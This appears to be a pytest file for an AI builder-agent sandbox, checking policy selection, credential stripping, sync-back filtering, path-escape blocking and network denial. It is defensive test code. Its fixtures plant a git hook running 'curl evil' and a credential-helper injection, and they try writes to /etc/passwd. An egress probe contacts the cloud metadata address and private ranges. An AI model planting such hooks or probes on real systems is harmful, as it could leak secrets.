"""The builders sandbox is the canonical selector plus a credential boundary.

#76's cutover invariant: Workspace/Agent/RSI/Builders code execution consumes
the canonical substrate — `ContainerBuilderSandbox` may own the host-side seed
denylist and sync-back filter (the credential boundary #77/#78 added), but the
sandbox itself comes from `maistro.sandbox`'s selector under `BUILDER_AGENT`,
and a host that cannot evidence a strong enough backend refuses.

Two lanes:

* The stub-backed tests below run everywhere: a vm-tier stub backend behind a
  real `SandboxSelector` pins the adapter contract — policy admission, seed
  filtering, isolation-until-sync, path escapes, exec bridging, teardown.
* The `TestOnAKataHost` lane runs only where the canonical selector actually
  evidences the Kata VM profile, and asserts the same isolation properties
  against the real backend (the supported deployment profile, #76).
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from maistro.sandbox import (
    BUILDER_AGENT,
    DENY_ALL,
    NoSuitableBackendError,
    SandboxConfig,
    SandboxInstance,
    SandboxSelector,
)
from maistro.sandbox.protocol import ExecResult
from maistro_bootstrap.builders.container_sandbox import (
    DEFAULT_IMAGE,
    ContainerBuilderSandbox,
)
from maistro_bootstrap.builders.errors import SandboxEscapeError


class _StubVMSandbox:
    """A vm-tier `SandboxProtocol` stand-in with real file operations.

    `exec` records and answers canned results; `read_file`/`write_file`
    operate on the spawned `workspace_host` exactly like the real backends'
    host-side workspace binds, so the adapter's seed/sync semantics are
    exercised against a filesystem, not a mock's return values.
    """

    tier = "vm"

    def __init__(self, exec_result: tuple[int, str] = (0, ""), exec_stderr: str = "") -> None:
        self.exec_result = exec_result
        self.exec_stderr = exec_stderr
        self.spawned: list[SandboxConfig] = []
        self.execs: list[tuple[list[str], int]] = []
        self.destroyed: list[str] = []

    async def spawn(self, *, config: SandboxConfig) -> SandboxInstance:
        self.spawned.append(config)
        return SandboxInstance(id=f"stub-{len(self.spawned)}", backend="stub", isolation_tier="vm")

    async def exec(
        self, instance: SandboxInstance, command: list[str], *, timeout_s: int = 120
    ) -> ExecResult:
        self.execs.append((list(command), timeout_s))
        return ExecResult(self.exec_result[0], self.exec_result[1], self.exec_stderr, 0)

    async def read_file(self, instance: SandboxInstance, path: str) -> bytes:
        return self._resolve(path).read_bytes()

    async def write_file(self, instance: SandboxInstance, path: str, content: bytes) -> None:
        target = self._resolve(path)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(content)

    async def destroy(self, instance: SandboxInstance) -> None:
        self.destroyed.append(instance.id)

    def _resolve(self, path: str) -> Path:
        assert self.spawned, "spawn must run before file operations"
        workdir = Path(self.spawned[0].workspace_host or ".")
        relative = Path(path)
        if relative.is_absolute():
            relative = relative.relative_to("/workspace")
        return workdir / relative


def _selector(backend: _StubVMSandbox) -> SandboxSelector:
    selector = SandboxSelector()
    selector.register("vm", backend)
    return selector


def _repo(tmp_path: Path) -> Path:
    (tmp_path / "hello.py").write_text('print("original")\n', encoding="utf-8")
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    return tmp_path


class TestSelectorAuthority:
    def test_enter_spawns_under_the_builders_policy(self, tmp_path: Path) -> None:
        backend = _StubVMSandbox()

        with ContainerBuilderSandbox(_repo(tmp_path), selector=_selector(backend)):
            assert backend.spawned, "the sandbox must come from the selector's backend"

        config = backend.spawned[0]
        assert config.image == DEFAULT_IMAGE
        assert config.min_isolation == BUILDER_AGENT.effective_min_tier == "vm"
        assert config.egress is DENY_ALL or config.egress.mode == "deny"
        assert config.timeout_s == BUILDER_AGENT.max_timeout_s
        assert config.memory_mb == BUILDER_AGENT.max_memory_mb
        # The workspace is a fresh seed copy under the canonical allowlist,
        # never the repo itself.
        workspace = Path(config.workspace_host or "")
        assert workspace != tmp_path
        assert workspace.is_relative_to(Path(tmp_path).parent) or str(workspace).startswith(
            "/tmp/maistro-workspace"
        )

    def test_a_host_without_a_strong_enough_backend_refuses(self, tmp_path: Path) -> None:
        weak = SandboxSelector()  # nothing registered: no evidenced backend at all

        with pytest.raises(NoSuitableBackendError):
            ContainerBuilderSandbox(_repo(tmp_path), selector=weak).__enter__()

        # Nothing was seeded and the host repo is untouched.
        assert (tmp_path / "hello.py").read_text(encoding="utf-8") == 'print("original")\n'

    def test_production_path_uses_the_canonical_build_selector(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import maistro_bootstrap.builders.container_sandbox as csbx_mod

        calls: list[object] = []
        stub = _StubVMSandbox()

        def _fake_build_selector(**kwargs: object) -> SandboxSelector:
            calls.append(kwargs)
            return _selector(stub)

        monkeypatch.setattr(csbx_mod, "build_selector", _fake_build_selector)

        with ContainerBuilderSandbox(_repo(tmp_path)):
            pass

        assert calls == [{}]  # the host-evidenced canonical selector, no opt-outs
        assert stub.spawned


class TestTheCredentialBoundary:
    @pytest.fixture()
    def seeded_repo(self, tmp_path: Path) -> Path:
        repo = _repo(tmp_path)
        subprocess.run(
            ["git", "-c", "user.email=t@t", "-c", "user.name=t", "add", "hello.py"],
            cwd=repo,
            check=True,
        )
        subprocess.run(
            ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"],
            cwd=repo,
            check=True,
        )
        (repo / ".env").write_text("GITHUB_TOKEN=ambient-secret\n", encoding="utf-8")
        (repo / "server.pem").write_text("PRIVATE KEY material\n", encoding="utf-8")
        with (repo / ".git" / "config").open("a") as cfg:
            cfg.write("\tcredential.helper = !leak-token\n")
        (repo / ".git" / "hooks" / "pre-commit").write_text(
            "#!/bin/sh\ncurl evil\n", encoding="utf-8"
        )
        fixtures = repo / "tests" / "fixtures"
        fixtures.mkdir(parents=True)
        (fixtures / "fixture.pem").write_text("test fixture not a credential\n", encoding="utf-8")
        return repo

    def test_seed_leaves_ambient_credentials_on_the_host(self, seeded_repo: Path) -> None:
        backend = _StubVMSandbox()

        with ContainerBuilderSandbox(seeded_repo, selector=_selector(backend)) as sb:
            seed = Path(backend.spawned[0].workspace_host or "")

            # Ambient credential surface: absent inside.
            assert not (seed / ".env").exists()
            assert not (seed / "server.pem").exists()
            assert not (seed / ".git" / "config").exists()
            assert not (seed / ".git" / "hooks").exists()
            # Key-shaped material is excluded at ANY depth.
            assert not (seed / "tests" / "fixtures" / "fixture.pem").exists()
            # The working tree (and git refs/objects for diff) still arrive.
            assert "original" in sb.read_file("hello.py")
            assert (seed / ".git" / "HEAD").exists()

        # The host's credential surface is untouched by the sandbox existing.
        assert (seeded_repo / ".env").exists()
        assert (seeded_repo / ".git" / "config").exists()

    def test_sync_never_brings_git_back(self, seeded_repo: Path) -> None:
        backend = _StubVMSandbox()
        head_before = (seeded_repo / ".git" / "HEAD").read_text(encoding="utf-8")

        with ContainerBuilderSandbox(seeded_repo, selector=_selector(backend)) as sb:
            seed = Path(backend.spawned[0].workspace_host or "")
            # Simulate the agent corrupting git state inside the sandbox: the
            # host-side sync filter is the boundary that must hold.
            (seed / ".git" / "refs" / "evil").write_text("corrupt", encoding="utf-8")
            sb.write_file("good_edit.py", "x = 1\n")
            sb.sync_to_host()

        assert (seeded_repo / "good_edit.py").exists()
        assert not (seeded_repo / ".git" / "refs" / "evil").exists()
        assert (seeded_repo / ".git" / "HEAD").read_text(encoding="utf-8") == head_before


class TestTheBuilderSandboxShape:
    def test_host_worktree_is_isolated_until_sync(self, tmp_path: Path) -> None:
        repo = _repo(tmp_path)
        host_before = (repo / "hello.py").read_text(encoding="utf-8")
        backend = _StubVMSandbox()

        with ContainerBuilderSandbox(repo, selector=_selector(backend)) as sb:
            sb.edit_file("hello.py", "original", "EDITED")
            sb.write_file("pkg/new.py", "x = 1\n")
            # Isolation: the agent's edits have NOT touched the host yet.
            assert (repo / "hello.py").read_text(encoding="utf-8") == host_before

            sb.sync_to_host()

        assert "EDITED" in (repo / "hello.py").read_text(encoding="utf-8")
        assert (repo / "pkg" / "new.py").exists()

    def test_path_escape_blocked(self, tmp_path: Path) -> None:
        backend = _StubVMSandbox()

        with ContainerBuilderSandbox(_repo(tmp_path), selector=_selector(backend)) as sb:
            with pytest.raises(SandboxEscapeError):
                sb.read_file("../escape.txt")
            with pytest.raises(SandboxEscapeError):
                sb.write_file("/etc/passwd", "bad")

    def test_exec_goes_through_the_selected_backend(self, tmp_path: Path) -> None:
        backend = _StubVMSandbox(exec_result=(1, "2 failed, 40 passed"))

        with ContainerBuilderSandbox(_repo(tmp_path), selector=_selector(backend)) as sb:
            assert sb.run_argv_status(["pytest", "-q"], timeout=900) == (1, "2 failed, 40 passed")
            assert sb.run_argv(["pytest", "-q"]) == "2 failed, 40 passed"
            sb.run_command("python probe.py")
            sb.diff()
            sb.search("EDITED")

        argvs = [argv for argv, _timeout in backend.execs]
        timeouts = [timeout for _argv, timeout in backend.execs]
        assert argvs[0] == ["pytest", "-q"]
        assert argvs[1] == ["pytest", "-q"]
        assert argvs[2] == ["sh", "-c", "python probe.py"]
        assert argvs[3][:3] == ["git", "-C", "/workspace"]
        assert argvs[4][:3] == ["grep", "-rl", "--include"]
        assert timeouts[0] == 900

    def test_exit_destroys_the_sandbox_and_removes_the_seed(self, tmp_path: Path) -> None:
        backend = _StubVMSandbox()

        with ContainerBuilderSandbox(_repo(tmp_path), selector=_selector(backend)):
            seed = Path(backend.spawned[0].workspace_host or "")
            assert seed.exists()

        assert backend.destroyed == ["stub-1"]
        assert not seed.exists()


def test_run_argv_streams_returns_separated_streams_and_the_status(
    tmp_path: Path,
) -> None:
    """The #614 seam: callers that PARSE output (tool reports, pytest
    collectors) need stdout/stderr SEPARATED — a stray stderr line merged into
    stdout would corrupt a JSON report and silently erase a real finding —
    with the exit status carried back intact."""
    backend = _StubVMSandbox(exec_result=(3, "to-stdout\n"), exec_stderr="to-stderr\n")
    (tmp_path / "f.py").write_text("x = 1\n", encoding="utf-8")
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)

    with ContainerBuilderSandbox(tmp_path, selector=_selector(backend)) as sb:
        rc, out, err = sb.run_argv_streams(
            ["sh", "-c", "echo to-stdout; echo to-stderr >&2; exit 3"]
        )

    assert rc == 3
    assert out == "to-stdout\n"
    assert err == "to-stderr\n"


# A candidate-shaped egress probe: it tries every path class #77 names — a
# public IPv4 target, a public IPv6 target, DNS resolution, the link-local
# cloud-metadata address, and RFC1918 private ranges — and reports which
# ones it could reach. Under `--network=none` every one of them must fail.
_EGRESS_PROBE = """import socket
for host, port in [
    ("1.1.1.1", 443),
    ("93.184.216.34", 80),
    ("2606:4700:4700::1111", 443),
    ("169.254.169.254", 80),
    ("10.0.0.1", 53),
    ("192.168.1.1", 80),
    ("172.17.0.1", 80),
]:
    try:
        socket.create_connection((host, port), 2).close()
        print(f"CONNECTED {host}")
    except OSError as exc:
        print(f"DENIED {host} {type(exc).__name__}")
try:
    socket.getaddrinfo("github.com", 443)
    print("DNS RESOLVED")
except OSError:
    print("DNS DENIED")
"""


def _kata_ready() -> bool:
    """The canonical selector evidences the Kata VM profile AND the image."""
    import shutil

    from maistro.sandbox import build_selector

    if shutil.which("docker") is None:
        return False
    try:
        selector = build_selector()
    except Exception:
        return False
    if "vm" not in selector.available_tiers:
        return False
    r = subprocess.run(
        ["docker", "image", "inspect", DEFAULT_IMAGE], capture_output=True, text=True
    )
    return r.returncode == 0


kata_only = pytest.mark.skipif(not _kata_ready(), reason="Kata VM profile unavailable")


@kata_only
class TestOnAKataHost:
    """The supported deployment profile (#76): assertions against the real VM.

    These run only where the canonical selector actually evidences Kata; the
    stub-backed classes above carry the adapter contract everywhere else.
    """

    def test_agent_edits_are_isolated_from_host(self, tmp_path: Path) -> None:
        repo = _repo(tmp_path)
        host_before = (repo / "hello.py").read_text(encoding="utf-8")

        with ContainerBuilderSandbox(repo) as sb:
            assert sb.read_file("hello.py") == host_before
            sb.edit_file("hello.py", "original", "EDITED")
            assert (repo / "hello.py").read_text(encoding="utf-8") == host_before
            sb.sync_to_host()

        assert "EDITED" in (repo / "hello.py").read_text(encoding="utf-8")

    def test_path_escape_blocked(self, tmp_path: Path) -> None:
        with ContainerBuilderSandbox(_repo(tmp_path)) as sb, pytest.raises(SandboxEscapeError):
            sb.read_file("../escape.txt")

    def test_agent_commands_cannot_reach_any_network_by_default(self, tmp_path: Path) -> None:
        with ContainerBuilderSandbox(_repo(tmp_path)) as sb:
            sb.write_file("probe.py", _EGRESS_PROBE)
            out = sb.run_command("python probe.py", timeout=120)

        assert "CONNECTED" not in out, f"candidate reached a network: {out}"
        assert "DNS RESOLVED" not in out, f"candidate resolved DNS: {out}"
        for host in ("1.1.1.1", "2606:4700:4700::1111", "169.254.169.254", "10.0.0.1"):
            assert f"DENIED {host}" in out, f"{host} was not probed: {out}"
        assert "DNS DENIED" in out
